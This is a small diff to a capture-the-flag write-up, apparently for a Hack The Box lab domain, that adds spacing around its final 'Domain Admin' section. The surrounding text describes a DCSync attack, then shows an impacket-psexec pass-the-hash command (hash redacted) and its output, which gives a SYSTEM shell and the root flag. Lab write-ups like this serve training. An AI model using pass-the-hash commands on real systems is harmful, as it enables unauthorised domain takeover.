@@ -221,6 +221,7 @@ DefaultAccount:503:[LM]:[NT-HASH-REDACTED]:::
 ```
 ## Domain Admin
 The DCSync attack was a success! We now have the Administrator NT hash. Since NTLM authentication accepts a hash in lieu of a password, we don't need to crack it. We can Pass-the-hash with impacket-psexec to give us a SYSTEM shell and the final flag.
+
 <pre class="flag-capture"><code>$ impacket-psexec htb.local/administrator@"10.129.95.210" -hashes :[REDACTED NT HASH]
 Impacket v0.13.0.dev0+20250130.104306.0f4b866 - Copyright Fortra, LLC and its affiliated companies 
 
@@ -240,6 +241,7 @@ nt authority\system
 C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
 f8a8...[REDACTED]...d010
 </code></pre>
+
 We have successfully compromised the domain.
 
 ## Takeaways
